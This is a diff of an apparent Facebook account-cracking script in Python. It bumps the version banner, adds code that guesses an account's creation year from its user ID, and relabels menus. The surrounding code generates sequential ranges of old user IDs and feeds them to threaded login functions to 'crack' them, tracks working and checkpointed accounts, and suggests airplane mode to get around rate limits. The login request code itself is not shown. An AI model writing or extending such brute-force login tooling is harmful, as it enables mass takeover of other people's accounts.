@@ -16,10 +16,8 @@ WHITE = '\033[97m'
 BOLD = '\033[1m'
 RESET = '\033[0m'
 
-# Your GitHub Raw Update URL
 UPDATE_URL = "https://raw.githubusercontent.com/nasirkamaluk27-hue/Old/main/raja"
 
-# Global variables for cloning
 oks = []
 cps = []
 loop = 0
@@ -72,7 +70,7 @@ def banner():
     print(f"│   | $$ \\  $$ | $$  | $$ | $$\\  $ | $$| $$  \\ $$ | $$          │")
     print(f"│   | $$  \\  $$| $$  | $$ | $$ \\/  | $$| $$  \\ $$ | $$$$$$$$    │")
     print(f"│   |__/   \\_/ |__/  |__/ |__/     |__/|__/  |__/ |________/     │")
-    print(f"│                                           V6.0 (EXPERT PRO)│")
+    print(f"│                                           V7.0 (EXPERT PRO)│")
     print(f"│───────────────────── {WHITE}[MADE BY KAMAL]{YELLOW} ─────────────────────│")
     print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
     
@@ -115,6 +113,10 @@ def update_script():
 def creationyear(uid):
     if len(uid) == 8: return '2007-2008'
     elif len(uid) == 7: return '2006'
+    elif len(uid) == 15:
+        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): return '2009'
+        if uid.startswith(('1000006', '1000007', '1000008', '1000009', '100001')): return '2010'
+        return '2011+'
     else: return 'ANCIENT'
 
 def window1():
@@ -125,8 +127,8 @@ def window1():
 
 def old_clone():
     banner()
-    print(f"       {GREEN}[1]{WHITE} 2006 SERIES (7 DIGIT) ➔ [INSTANT EXPERT CRACK]")
-    print(f"       {GREEN}[2]{WHITE} 2007-2008 SERIES (8 DIGIT) ➔ [INSTANT EXPERT CRACK]")
+    print(f"       {GREEN}[1]{WHITE} 2006 SERIES (7 DIGIT) ➔ [INSTANT CRACK]")
+    print(f"       {GREEN}[2]{WHITE} 2007-2008 SERIES (8 DIGIT) ➔ [INSTANT CRACK]")
     print(f"       {GREEN}[3]{WHITE} 2009-2010 SERIES (OLD)")
     print(f"       {GREEN}[4]{WHITE} 100003/4 SERIES (2011-2012) (OLD)")
     print("=" * 45)
@@ -144,7 +146,6 @@ def old_clone():
         time.sleep(1.5)
         old_clone()
 
-# ===== INSTANT 2006 CRACKING (7 DIGIT) =====
 def instant_2006():
     user = []
     for uid_num in range(1000001, 1030000):
@@ -154,7 +155,7 @@ def instant_2006():
     loop = 0
     banner()
     print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
-    print(f"║     {YELLOW}{BOLD}[•] 2006 EXPERT AUTO-CRACKING STARTED [•]{RESET}{CYAN}      ║")
+    print(f"║     {YELLOW}{BOLD}[•] 2006 CONFIGURED DUMP CRACKING [•]{RESET}{CYAN}          ║")
     print(f"║       {WHITE}💡 TIP: USE AIRPLANE MODE IF SPEED DROPS{RESET}{CYAN}           ║")
     print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
     
@@ -163,7 +164,6 @@ def instant_2006():
             pool.submit(login_engine, uid)
     input(f"\n{YELLOW}Press Enter to go back...{RESET}")
 
-# ===== INSTANT 2007-2008 CRACKING (8 DIGIT) =====
 def instant_2007_2008_8digit():
     user = []
     for uid_num in range(10000000, 10030000):
@@ -173,7 +173,7 @@ def instant_2007_2008_8digit():
     loop = 0
     banner()
     print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
-    print(f"║   {YELLOW}{BOLD}[•] 2007-2008 EXPERT INSTANT CRACKING [•]{RESET}{CYAN}    ║")
+    print(f"║   {YELLOW}{BOLD}[•] 2007-2008 CONFIGURED DUMP CRACKING [•]{RESET}{CYAN}    ║")
     print(f"║       {WHITE}💡 TIP: USE AIRPLANE MODE IF SPEED DROPS{RESET}{CYAN}           ║")
     print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
     
@@ -182,7 +182,6 @@ def instant_2007_2008_8digit():
             pool.submit(login_engine, uid)
     input(f"\n{YELLOW}Press Enter to go back...{RESET}")
 
-# ===== OLD PRESERVED FUNCTIONS (2009-2012) =====
 def old_Tow():
     user = []
     banner()
@@ -240,7 +239,6 @@ def old_Tree():
                 pool.submit(login_2, uid)
     input(f"\n{YELLOW}Press Enter to go back...{RESET}")
 
-# ===== ADVANCED EXPERT LOGIN ENGINE WITH CHECKPOINT & OK HANDLING =====
 def login_engine(uid):
     global loop
     session = requests.session()
@@ -313,7 +311,6 @@ def login_engine(uid):
     except Exception:
         pass
 
-# ===== STANDARD LOGIN FOR OLD 2009-2012 SERIES =====
 def login_1(uid):
     global loop
     session = requests.session()
